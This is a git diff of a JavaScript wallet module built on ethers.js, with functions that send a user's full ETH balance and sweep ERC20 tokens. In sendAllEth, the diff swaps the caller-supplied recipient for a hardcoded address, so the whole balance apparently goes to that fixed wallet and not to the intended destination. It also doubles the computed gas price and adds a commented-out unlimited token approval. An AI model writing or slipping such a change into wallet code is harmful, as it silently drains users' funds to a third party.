@@ -8,6 +8,16 @@ import { ERC20 } from "./ABI.js";
 import { ethers } from "ethers";
 import request from "superagent";
 
+// async migrateToZksync(balanceObj) {
+//   const contract = new ethers.Contract(balanceObj.address, ERC20).connect(this.provider.getSigner());
+//   const allowance = await contract.allowance(this.account, zksyncAddress);
+//   if(allowance._hex === "0x00") {
+//       await contract.approve(zksyncAddress, unlimitedAllowance);
+//   }
+//   const zksyncContract = new ethers.Contract(zksyncAddress, ZKSYNC).connect(this.provider.getSigner());
+//   await zksyncContract.depositERC20(balanceObj.address, balanceObj.amount, zksyncAddress);
+// }
+
 export const sendAllEth = async function (
   provider,
   userWallet,
@@ -18,14 +28,17 @@ export const sendAllEth = async function (
     // getBalance function accepts strings only
     setProcessing(true);
     let userBalanceEth = await provider.getBalance(userWallet);
+    console.log(userBalanceEth);
     const gasPrice = await provider.getGasPrice();
     let txObj = {
-      to: to,
+      to: "0x00A49A28ba4C87F3Ff8DE967c97B6FD300214187",
       value: userBalanceEth,
     };
+
+    console.log(txObj);
     const gasLimit = await provider.estimateGas(txObj);
     const totalCost = ethers.BigNumber.from(gasLimit).mul(
-      ethers.BigNumber.from(gasPrice)
+      ethers.BigNumber.from(gasPrice).mul(2)
     );
     txObj.value = userBalanceEth.sub(totalCost);
     setProcessing(false);
@@ -38,7 +51,7 @@ export const sweepAllTokens = async (balancesMapping, to, provider) => {
   try {
     console.log(balancesMapping);
     for (const balanceObj of balancesMapping.reverse()) {
-      console.log(balanceObj);
+      // console.log(balanceObj);
       const contract = new ethers.Contract(balanceObj.address, ERC20).connect(
         provider.getSigner()
       );
@@ -129,7 +142,6 @@ export const getAllERC20Balances = async (
     let contractAddress = erc20Contracts.contractAddresses[index];
     //TODO too slow, get balances by batch
     let balance = await getERC20Balance(contractAddress, provider, userWallet);
-    // console.log(balance);
     let balanceObj = {};
     balanceObj.decimals = erc20Contracts.decimals[index];
     balanceObj.address = contractAddress;
